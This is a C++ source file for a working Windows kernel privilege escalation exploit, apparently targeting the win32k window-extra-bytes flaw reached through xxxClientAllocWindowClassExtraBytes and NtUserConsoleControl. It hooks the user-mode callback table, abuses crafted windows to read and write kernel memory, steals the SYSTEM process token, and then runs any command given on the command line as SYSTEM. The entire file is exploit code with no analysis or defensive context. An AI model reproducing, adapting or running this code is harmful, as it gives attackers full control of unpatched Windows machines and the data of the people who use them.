#include <Windows.h>
#include <iostream>
#include <time.h>

using namespace std;

using PHMValidateHandle = void* (NTAPI*)(HANDLE h, char type);
using PxxxClientAllocWindowClassExtraBytes = void* (NTAPI*)(DWORD64* Length);
using PNtUserConsoleControl = DWORD64 (NTAPI*)(int nConsoleCommand, HWND* pHwnd, int nConsoleInformationLength);


extern "C"
NTSTATUS 
NtCallbackReturn(
	PVOID Result, ULONG ResultLength, NTSTATUS Status
);

#pragma comment(lib,"ntdll")


PHMValidateHandle HMValidateHandle = nullptr;
PxxxClientAllocWindowClassExtraBytes xxxClientAllocWindowClassExtraBytes = nullptr;
PNtUserConsoleControl NtUserConsoleControl = nullptr;

ULONG_PTR g_random = 0;
ULONG_PTR g_exploit = 0;
ULONG_PTR g_refMem5 = 0;
HWND g_hWndMax = 0;
ULONG_PTR g_rpDesk = 0;
bool g_isInit = false;
DWORD g_left = 0;
DWORD g_offset = 0;
ULONG_PTR g_minBaseAddress = 0;
ULONG_PTR g_regionSize = 0;
DWORD g_thrdeskheadClockObjMin = 0;

// 版本控制
ULONG_PTR g_offsetActiveProcessLinks = 0x448;
ULONG_PTR g_offsetToken = 0x4b8;
ULONG_PTR g_offsetUniqueProcessId = 0x440;


typedef DWORD64 QWORD;

bool GetHMValidateHandleAddress() {
	HMODULE hUser32 = LoadLibrary(L"user32.dll");
	BYTE* pIsMenu = (BYTE*)&IsMenu;
	ULONG offset = 0;
	for (ULONG i = 0; i < 0x1000; i++) {
		BYTE* opcode = pIsMenu + i;
		if (*opcode == 0xE8) {
			offset = i + 1;
			break;
		}
	}
	if (offset == 0) {
		cout << "Failed to get HMValidateHandle's offset" << endl;
		return false;
	}

	ULONG addr = *(ULONG*)(pIsMenu + offset);
	offset = (ULONG)pIsMenu - (ULONG)hUser32 + addr;
	HMValidateHandle = static_cast<PHMValidateHandle>((void*)((ULONG_PTR)hUser32 + offset + 11));
	return true;
}

HWND GuessHwnd(ULONG_PTR* pBaseAddress, DWORD regionSize) {
	ULONG_PTR baseAddressBak = *pBaseAddress;
	ULONG_PTR baseAddress = *pBaseAddress;
	DWORD regionSizeBak = regionSize;

	HWND magicHwnd = nullptr;

	do 	{
		while (*(WORD*)baseAddress != g_random && regionSize > 0) {
			baseAddress += 2;
			regionSize--;
		}

		if (*(DWORD*)((DWORD*)baseAddress + (0x18 >> 2) - (0xc8 >> 2)) != 0x8000000) {
			//获取不到才会走下面的步骤
			baseAddress = baseAddress + 4;
			ULONG_PTR sub = baseAddressBak - baseAddress;
			regionSize = regionSizeBak + sub;
		}

		magicHwnd = (HWND) * (DWORD*)(baseAddress - 0xc8);

		if (magicHwnd) {
			break;
		}
	} while (true);

	return magicHwnd;
}

void* FakexxxClientAllocWindowClassExtraBytes(DWORD64* Length) {
	DWORD64 len = *Length;

	if (len == g_random) {
		g_offset = 1;
		HWND magicHwnd = GuessHwnd(&g_minBaseAddress, g_regionSize);
		printf("FakexxxClientAllocWindowClassExtraBytes MagicHwnd == %p\r\n", magicHwnd);

		if (magicHwnd) {
			NtUserConsoleControl(6i64, &magicHwnd, 0x10);
			ULONG_PTR Result = g_thrdeskheadClockObjMin;
			NtCallbackReturn(&Result, 24i64, 0i64);
		}
	}
	printf("FakeCalled\r\n");
	return xxxClientAllocWindowClassExtraBytes(Length);
}


LRESULT WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	if (uMsg != WM_DESTROY) {
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
	PostQuitMessage(0);
	return 0;
}


ULONG_PTR ReadKernelValue64(ULONG_PTR address) {
	MENUBARINFO pmbi = { sizeof(pmbi) };

	if (!g_isInit) {
		ULONG_PTR* pBuffer = (ULONG_PTR*)LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, 0x200ui64);

		if (pBuffer != nullptr) {
			ULONG_PTR base = 0x000000400000000;
			ULONG_PTR add = 0x000000800000008;

			for (int i = 0; i < 0x40; i++) {
				*(pBuffer + i) = base + add * i;
			}
		}
		*(QWORD*)g_refMem5 = (ULONG_PTR)pBuffer;

		GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);

		g_left = pmbi.rcBar.left;
		g_isInit = true;
	}

	*(QWORD*)g_refMem5 = address - g_left;
	GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);

	return (unsigned int)pmbi.rcBar.left + ((__int64)pmbi.rcBar.top << 32);
}


int wmain(int argc,wchar_t* argv[]) {
	if (argc < 2) {
		printf("Usage: exp.exe command Ex: exp.exe whoami\n");
		return 0;
	}

	bool success = GetHMValidateHandleAddress();
	if (!success) {
		cout << "[1] Failed to locate HmValidateHandle, exiting\n" << endl;
		return 1;
	}
	HMODULE hModule = GetModuleHandle(L"win32u.dll");
	if (hModule) {
		NtUserConsoleControl = (PNtUserConsoleControl)GetProcAddress(hModule, "NtUserConsoleControl");
		printf("NtUserConsoleControl: %p\n", NtUserConsoleControl);

		ULONG_PTR kernelCallbackTable = *(ULONG_PTR*)(__readgsqword(0x60) + 0x58);
		LPVOID pfn = (PVOID)(kernelCallbackTable + 0x3D8);
		xxxClientAllocWindowClassExtraBytes = (PxxxClientAllocWindowClassExtraBytes)*(DWORD64*)pfn;
		printf("xxxClientAllocWindowClassExtraBytes: %p\r\n",xxxClientAllocWindowClassExtraBytes);
		system("pause");

		// hook xxxClientxxxx
		DWORD old;
		VirtualProtect(pfn, 0x300ui64, PAGE_EXECUTE_READWRITE,&old);
		*(DWORD64*)pfn = (DWORD64)FakexxxClientAllocWindowClassExtraBytes;
		VirtualProtect(pfn, 0x300ui64, old, &old);

		srand(time(0));
		g_random = (rand() % 255 + 0x1234) | 1;

		WNDCLASSEX wndClassEx = {};
		wndClassEx.lpfnWndProc = WndProc;
		wndClassEx.cbSize = 80;
		wndClassEx.style = CS_VREDRAW | CS_HREDRAW;
		wndClassEx.cbWndExtra = 32;
		wndClassEx.cbClsExtra = 0;
		wndClassEx.hInstance = GetModuleHandle(nullptr);
		wndClassEx.lpszClassName = L"normalClass";
		ATOM g_lpWcxNormal = RegisterClassEx(&wndClassEx);

		wndClassEx.cbWndExtra = g_random;
		wndClassEx.lpszClassName = L"magicClass";
		ATOM g_lpWcxMagic = RegisterClassEx(&wndClassEx);

		CreatePopupMenu();

		ULONG_PTR pMem1 = (__int64)LocalAlloc(LMEM_FIXED|LMEM_ZEROINIT, 0x200ui64);
		ULONG_PTR pMem2 = (__int64)LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, 0x30ui64);
		ULONG_PTR pMem3 = (__int64)LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, 4);
		ULONG_PTR pMem4 = (ULONG_PTR)LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, 0xA0ui64);
		HLOCAL pMem5 = LocalAlloc(0x40, 8ui64);

		QWORD	offset_0x2c = 0x2C;
		QWORD	offset_0x28 = 0x28;
		QWORD	offset_0x40 = 0x40;
		QWORD	offset_0x44 = 0x44;
		QWORD	offset_0x58 = 0x58;
		QWORD	offset_0x128 = 0x128;
		QWORD	offset_0xc8 = 0xc8;
		QWORD	offset_0x18 = 0x18;
		QWORD	offset_0x10 = 0x10;
		QWORD	offset_0x220 = 0x220;
		QWORD	offset_0x80 = 0x80;
		QWORD	offset_0x98 = 0x98;
		QWORD	offset_0x50 = 0x50;
		QWORD	offset_0xe0 = 0xe0;

		DWORD* refMem1 = (DWORD*)pMem1;
		QWORD refMem2 = pMem2;
		QWORD refMem3 = pMem3;
		QWORD refMem4 = pMem4;
		g_refMem5 = (__int64)pMem5;

		*(DWORD*)(pMem2 + offset_0x2c) = 16;
		*refMem1 = 0x88888888;
		*(QWORD*)&refMem1[2 * ((unsigned int)offset_0x28 >> 3)] = refMem2;
		refMem1[(unsigned __int64)(unsigned int)offset_0x40 >> 2] = 1;
		refMem1[(unsigned __int64)(unsigned int)offset_0x44 >> 2] = 1;

		*(QWORD*)&refMem1[2 * ((unsigned __int64)(unsigned int)offset_0x58 >> 3)] = (QWORD)pMem5;
		*(QWORD*)(refMem3 + 0x8) = 16i64;
		*(QWORD*)refMem3 = (QWORD)refMem1;
		*(QWORD*)(refMem4 + offset_0x98) = refMem3;

		// CreateWnd
		printf("CreateWnd\r\n");
		system("pause");

		MEMORY_BASIC_INFORMATION info = { 0 };

		__int64 index = 0i64;
		__int64 loop = 10i64;

		QWORD thrdeskheadClockObj1 = 0;
		QWORD thrdeskheadClockObj2 = 0;
		QWORD entryDesktop[10] = {};
		HWND hwndNormal[10] = {};

		do 	{
			HWND hwnd = CreateWindowEx(WS_EX_NOACTIVATE,
				(LPCWSTR)(unsigned __int16)g_lpWcxNormal, L"somewnd",
				WS_DISABLED,
				0, 0, 0, 0, nullptr, CreateMenu(), GetModuleHandle(nullptr), 0);

			hwndNormal[index] = hwnd;
			QWORD firstEntryDesktop = (QWORD)HMValidateHandle(hwnd, 1);
			entryDesktop[index] = firstEntryDesktop;

			printf("Hwnd: %08X firstEntryDesktop=%p\r\n", hwnd, firstEntryDesktop);

			VirtualQuery((LPVOID)firstEntryDesktop, &info, sizeof(info));
			printf("BaseAddress: %p, RegionSize=%p\r\n", info.BaseAddress, info.RegionSize);

			if (g_minBaseAddress == 0) {
				g_minBaseAddress = (QWORD)info.BaseAddress;
				g_regionSize = info.RegionSize;
			}
			else {
				if (g_minBaseAddress > (QWORD)info.BaseAddress) {
					// 保存最小基地址
					g_minBaseAddress = (QWORD)info.BaseAddress;
					g_regionSize = info.RegionSize;
				}
			}

			++index;
			--loop;
		} while (loop);

		printf("MinBaseAddress:%p RegionSize=%p\r\n", g_minBaseAddress, g_regionSize);

		thrdeskheadClockObj1 = *(DWORD*)((char*)entryDesktop[0] + 8);
		thrdeskheadClockObj2 = *(DWORD*)((char*)entryDesktop[1] + 8);

		HWND hwndMin = *(HWND*)((char*)hwndNormal + (thrdeskheadClockObj2 < thrdeskheadClockObj1 ? 8 : 0));
		printf("thrdeskheadClockObj1: %p,thrdeskheadClockObj2: %p\r\n", thrdeskheadClockObj1, thrdeskheadClockObj2);
		int temp = 0i64;
		if (thrdeskheadClockObj1 <= thrdeskheadClockObj2)
			temp = 1;
		g_hWndMax = hwndNormal[temp];
		QWORD firstEntryDesktopMax = entryDesktop[temp];

		QWORD firstEntryDesktopMin = *(__int64*)((char*)entryDesktop + (thrdeskheadClockObj2 < thrdeskheadClockObj1 ? 8 : 0));

		g_thrdeskheadClockObjMin = *(DWORD*)(firstEntryDesktopMin + 8);
		printf("g_thrdeskheadClockObjMin %p\r\n", g_thrdeskheadClockObjMin);
		DWORD thrdeskheadClockMax = *(DWORD*)((char*)firstEntryDesktopMax + 8);
		printf("thrdeskheadClockMax: %p\r\n", thrdeskheadClockMax);
		for (int i = 2i64; i < 10; i++)
			DestroyWindow(hwndNormal[i]);

		NtUserConsoleControl(6i64, &hwndMin, 0x10);

		DWORD tagWndMin_offset_0x128 = *(DWORD*)(firstEntryDesktopMin + offset_0x128);
		DWORD tagWndMax_offset_0x128 = *(DWORD*)(firstEntryDesktopMax + offset_0x128);


		HWND realMagicHwnd = CreateWindowExW(WS_EX_NOACTIVATE,
			(LPCWSTR)(unsigned __int16)g_lpWcxMagic, L"somewnd",
			WS_DISABLED,
			0, 0, 0, 0, 0, CreateMenu(), GetModuleHandle(nullptr), 0);

		printf("realMagicHwnd = %p\n", realMagicHwnd);

		DWORD ret = SetWindowLong(realMagicHwnd, offset_0x128, g_thrdeskheadClockObjMin);
		printf("ret=%p\r\n", ret);

		printf("tagWndMin offset 0x128 = %p\r\n", tagWndMin_offset_0x128);

		SetWindowLong(realMagicHwnd, offset_0xc8, 0x0FFFFFFF);

		g_rpDesk = *(QWORD*)(firstEntryDesktopMax + offset_0x18);
		printf("g_rpDesktop :%p\r\n", g_rpDesk);
		SetWindowLongPtr(hwndMin, offset_0x18 + thrdeskheadClockMax - g_thrdeskheadClockObjMin, g_rpDesk ^ 0x4000000000000000i64);

		g_exploit = SetWindowLongPtr(g_hWndMax, -12, pMem4);

		printf("g_exploit=%p\r\n", g_exploit);

		QWORD offset = thrdeskheadClockMax - g_thrdeskheadClockObjMin;
		QWORD newLong = g_exploit;
		SetWindowLongPtr(hwndMin, offset_0x18 + thrdeskheadClockMax - g_thrdeskheadClockObjMin, g_rpDesk);

		system("pause");

		QWORD first = ReadKernelValue64(g_exploit + offset_0x50);
		printf("first pointer: %p\n", first);

		QWORD second = ReadKernelValue64(first + offset_0x18);
		printf("second pointer: %p\n", second);

		QWORD third = ReadKernelValue64(second + offset_0x80);
		printf("third pointer: %p\n", third);

		QWORD fourth = ReadKernelValue64(first + offset_0x10);
		printf("fourth pointer: %p\n", fourth);

		QWORD fifth = ReadKernelValue64(fourth);
		printf("fifth pointer: %p\n", fifth);

		QWORD eprocess = ReadKernelValue64(fifth + offset_0x220);
		printf("eprocess pointer: %p\n", eprocess);

		QWORD myEprocess = eprocess;
		DWORD myPid = GetCurrentProcessId();
		QWORD token = 0;
		QWORD tokenAddress = 0;
		system("pause");
		

		QWORD systemToken = 0;
		while (!systemToken || !tokenAddress) {
			DWORD pid = ReadKernelValue64(eprocess + (unsigned int)g_offsetUniqueProcessId);
			printf("pid=%d\r\n", pid);
			if (pid == 0x4) {
				systemToken = ReadKernelValue64(eprocess + (unsigned int)g_offsetToken);
			}
			if(pid==myPid)
				tokenAddress = eprocess + g_offsetToken;
			eprocess = ReadKernelValue64(eprocess + (unsigned int)g_offsetActiveProcessLinks)
				-(unsigned int)g_offsetActiveProcessLinks;
			if (eprocess == myEprocess)
				break;
		}
		
		// write
		SetWindowLongPtr(hwndMin, thrdeskheadClockMax + offset_0x128 - g_thrdeskheadClockObjMin, tokenAddress);
		SetWindowLongPtr(g_hWndMax, 0, systemToken);

		QWORD tagWndMagic = (QWORD)HMValidateHandle(realMagicHwnd, 1i64);
		int size = 8i64;
		QWORD cbWndExtra = *(QWORD*)(tagWndMagic+offset_0xe0)^ 0x80000000000i64;

		SetWindowLongPtr(hwndMin, offset_0x128 + thrdeskheadClockMax - g_thrdeskheadClockObjMin,
			third + *(unsigned int*)(size + tagWndMagic) + (unsigned int)offset_0x128);
		SetWindowLongPtr(g_hWndMax, 0, 0);
		SetWindowLongPtr(hwndMin, offset_0x128 + thrdeskheadClockMax - g_thrdeskheadClockObjMin,
			third + *(unsigned int*)(size + tagWndMagic) + (unsigned int)offset_0xe0);
		SetWindowLongPtr(g_hWndMax, 0, cbWndExtra);

		SetWindowLongPtr(hwndMin, offset_0x18 + thrdeskheadClockMax - g_thrdeskheadClockObjMin, g_rpDesk ^ 0x4000000000000000i64);
		SetWindowLongPtr(g_hWndMax, -12, newLong);

		SetWindowLongPtr(hwndMin, offset_0x18 + thrdeskheadClockMax - g_thrdeskheadClockObjMin, g_rpDesk);
		SetWindowLongPtr(hwndMin, offset_0x128 + thrdeskheadClockMax - g_thrdeskheadClockObjMin, tagWndMax_offset_0x128);
		SetWindowLongPtr(hwndMin, offset_0x128, (unsigned int)tagWndMin_offset_0x128);

		/*LocalFree(pMem1);
		LocalFree(pMem2);
		LocalFree(pMem3);
		LocalFree(pMem4);
		LocalFree(pMem5);*/

		SECURITY_ATTRIBUTES		sa;
		HANDLE					hRead, hWrite;
		byte					buf[40960] = { 0 };
		STARTUPINFOW			si;
		PROCESS_INFORMATION		pi;
		DWORD					bytesRead;
		RtlSecureZeroMemory(&si, sizeof(si));
		RtlSecureZeroMemory(&pi, sizeof(pi));
		RtlSecureZeroMemory(&sa, sizeof(sa));
		int br = 0;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
			return -3;
		}
		wprintf(L"[*] Trying to execute %s as SYSTEM\n", argv[1]);
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfoW(&si);
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;
		si.lpDesktop = const_cast<LPWSTR>(L"WinSta0\\Default");
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		
		wchar_t cmd[4096] = { 0 };

		for (int i = 1; i < argc; i++) {
			::wcscat_s(cmd, argv[i]);
			::wcscat_s(cmd, L" ");
		}
		if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
			CloseHandle(hWrite);
			CloseHandle(hRead);
			printf("[!] CreateProcessW Failed![%lx]\n", GetLastError());
			return -2;
		}
		CloseHandle(hWrite);
		printf("[+] ProcessCreated with pid %d!\n", pi.dwProcessId);
		while (1) {
			if (!ReadFile(hRead, buf + br, 4000, &bytesRead, NULL))
				break;
			br += bytesRead;
		}
		puts("===============================");
		puts((char*)buf);
		fflush(stdout);
		fflush(stderr);
		CloseHandle(hRead);
		CloseHandle(pi.hProcess);

	}


	system("pause");
	return 0;
}
